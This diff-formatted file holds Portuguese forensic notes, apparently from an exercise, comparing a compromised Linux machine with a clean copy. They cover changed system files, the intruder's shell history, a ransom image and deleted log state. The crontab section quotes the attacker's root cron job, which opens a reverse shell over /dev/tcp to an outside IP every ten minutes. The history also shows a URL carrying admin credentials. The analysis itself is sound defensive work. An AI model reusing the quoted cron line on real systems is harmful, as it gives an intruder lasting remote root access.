@@ -1,0 +1,276 @@
+usamos o comando diff entre os 2 discos: 
+encontramos estas diferenças nos diretorios:
+
+etc/crontab: na maquina hackeada foi acrescentada mais uma linha -> 
+		
+*/10 * * * * root 0<&196;exec 196<>/dev/tcp/96.127.23.115/5556; sh <&196 >&196 2>&196
+													
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+
+etc/fstab: na maquina hackeada foram acrescentadas as seguintes linhas ->
+			
+# swap was on /dev/sda5 during installation
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+/dev/sr1        /media/cdrom1   udf,iso9660 user,noauto     0       0
+
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+
+etc/resolv.conf: na maquina hackeada foram alterados os servidores dns para :
+
+domain home
+search home
+nameserver 192.168.50.100
+nameserver 213.228.128.156
+nameserver 213.228.128.5
+													
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+
+home/dev: na maquina hackeada existe um ficheiro a mais =>.viminfo: alterações feitas atraves do vim? => dos mais recentes para os mais antigos.
+Este ficheiro pode estar relacionado com o ficheiro bash_history. (encontra-se a seguir).
+						# Viminfo version
+						|1,4
+						
+						# Value of 'encoding' when this file was written
+						*encoding=utf-8
+						
+						
+						# hlsearch on (H) or off (h):
+						~h
+						# Command Line History (newest to oldest):
+						:wq
+						|2,0,1641492698,,"wq"
+						
+						# Search String History (newest to oldest):
+						
+						# Expression History (newest to oldest):
+						
+						# Input Line History (newest to oldest):
+						
+						# Debug Line History (newest to oldest):
+						
+						# Registers:
+						
+						# File marks:
+						'0  21  0  ~/web/Dockerfile
+						|4,48,21,0,1641492698,"~/web/Dockerfile"
+						
+						# Jumplist (newest first):
+						-'  21  0  ~/web/Dockerfile
+						|4,39,21,0,1641492698,"~/web/Dockerfile"
+						-'  1  0  ~/web/Dockerfile
+						|4,39,1,0,1641492689,"~/web/Dockerfile"
+						
+						# History of marks within files (newest to oldest):
+						
+						> ~/web/Dockerfile
+							*	1641492697	0
+							"	21	0
+							^	21	1
+							.	21	0
+							+	20	0
+							+	21	0
+				
+				
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------		
+				
+home/dev:bash_history: este ficheiro estava vazio. Depois de hackeada o ficheiro tinha o seguinte conteúdo:(comandos feitos pelo hacker?)ele chama o vim. Daí o ficheiro viminfo falado anteriormente.
+
+							docker stop app
+							docker rm -f app
+							docker rm -f app
+							docker rm -f app
+							ls
+							vim entrypoint.sh 
+							vim app.py 
+							docker rm -f app
+							docker rm -f app
+							vim Dockerfile 
+							docker rm -f app
+							vim app.py 
+							docker rm -f app
+							vim auth.py 
+							docker rm -f app
+							vim auth.py 
+							docker rm -f app
+							vim auth.py 
+							docker rm -f app
+							vim auth.py 
+							docker rm -f app
+							docker rm -f app
+							vim auth.py 
+							docker rm -f app
+							vim auth.py 
+							docker rm -f app
+							vim auth.py 
+							vim app.py 
+							vim auth.py 
+							vim app.py 
+							vim Dockerfile 
+							ssh 192.168.1.10
+							wget http://admin:75debe8ecad2b043072ce03d1dc3e635@192.168.1.21
+							ls
+							ls -la
+							ls
+							ls -la
+							find .
+							ls
+							cd challenge/
+							ls
+							rm -rf __pycache__
+							ls
+							cd static/
+							ls
+							cd img/
+							ls
+							ls
+							cd ..
+							ls
+							cd gallery/
+							ls
+							cat data 
+							cd ..
+							ls
+							cd ..
+							ls
+							vim Dockerfile
+							docker build app .
+							docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							vim Dockerfile
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							vim Dockerfile
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							vim requirements.txt
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							touch run.sh
+							vim Dockerfile
+							ls
+							vim Dockerfile
+							vim entrypoint.sh
+							s
+							vim Dockerfile 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							vim Dockerfile 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							ls
+							vim app.py 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							docker rm -f app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							vim app.py 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							vim app.py 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app ap
+							ls
+							vim Dockerfile 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							vim app.py 
+							docker ps
+							vim Dockerfile 
+							vim entrypoint.sh 
+							vim Dockerfile 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 --name app --restart=always app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 -d --name app --restart=always app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 -d --name app --restart=always -v ./static/gallery:/app/static/gallery app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 -d --name app --restart=always -v $(pwd)/static/gallery:/app/static/gallery app
+							cd..
+							cd ..
+							cd app
+							cd web
+							ls
+							cat wsgi.py 
+							grep b *
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 -d --name app --restart=always -v $(pwd)/static/gallery:/app/static/gallery app
+							docker ps
+							vim Dockerfile 
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker build -t app .
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker rm -f app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 -d --name app --restart=always -v $(pwd)/static/gallery:/app/static/gallery app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker rm -f app
+							DOCKER_HOST='tcp://0.0.0.0:2376' docker run -p 80:5000 -d --name app --restart=always -v $(pwd)/static/gallery:/app/static/gallery app
+							exit
+							su
+							ip a l
+							exit
+							su
+							------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+/var/lib/dhcp/dhclient.enp0s3.leases: dhcp lease representa ips que foram dados temporariamente à maquina. Antes de ser hackeada e depois, os "leases"(ips) mudam(observando pelo ficheiro) o ip da  maquina hackeada coincide com o ip que esta presente no wireshark(fixed-address 192.168.1.251 => ip da nossa maquina) 
+							
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+			
+home/dev/web/static/gallery =>bn.png => atacante pôs uma imagem a informar que fomos atacados e que procedimentos teriamos que fazer para haver um restauro de dados.
+
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+
+/media/user/91e17453-7a88-422c-9fff-c407e86d361c1/var/backups => o atacante fez zip's de ficheiros já existentes.Nao percebo para que serviam estes ficheiros.
+
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+
+/var/lib/apt/lists: ficheiro lock eliminado => sem permissoes para ler ficheiro 
+
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+
+/var/lib/avahi-autoipd=> os ficheiros 08:00:27:3e:8d:3e(continha o ip 169.254.6.171)
+ e 08:00:27:e2:56:e4 (continha o ip 169.254.12.12)foram eliminados da maquina.  esta pasta contem um protocolo para configurar ips automaticanente sem necessidade de um dhcp server 
+
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+ 
+/var/lib/logrotate => o ficheiro status foi apagado(este ficheiro estava na maquina antes de ser hackeada) => continha historial/informações das horas em que certos dados foram acedidos::
+					logrotate state -- version 2
+					"/var/log/syslog" 2022-1-21-17:33:59
+					"/var/log/dpkg.log" 2022-1-7-12:0:0
+					"/var/log/auth.log" 2022-1-21-17:33:59
+					"/var/log/apt/term.log" 2022-1-7-12:0:0
+					"/var/log/apt/history.log" 2022-1-7-12:0:0
+					"/var/log/alternatives.log" 2022-1-7-12:0:0
+					"/var/log/debug" 2022-1-21-17:33:59
+					"/var/log/mail.log" 2022-1-7-12:0:0
+					"/var/log/kern.log" 2022-1-21-17:33:59
+					"/var/log/wtmp" 2022-1-7-12:0:0
+					"/var/log/daemon.log" 2022-1-21-17:33:59
+					"/var/log/mail.warn" 2022-1-7-12:0:0
+					"/var/log/btmp" 2022-1-7-12:0:0
+					"/var/log/lpr.log" 2022-1-7-12:0:0
+					"/var/log/mail.err" 2022-1-7-12:0:0
+					"/var/log/user.log" 2022-1-7-12:0:0
+					"/var/log/mail.info" 2022-1-7-12:0:0
+					"/var/log/cron.log" 2022-1-7-12:0:0
+					"/var/log/messages" 2022-1-21-17:33:59
+
+------------------//-------------------------------------//--------------------------------//--------------------------//-------------------//--------	
+
+
+					
+
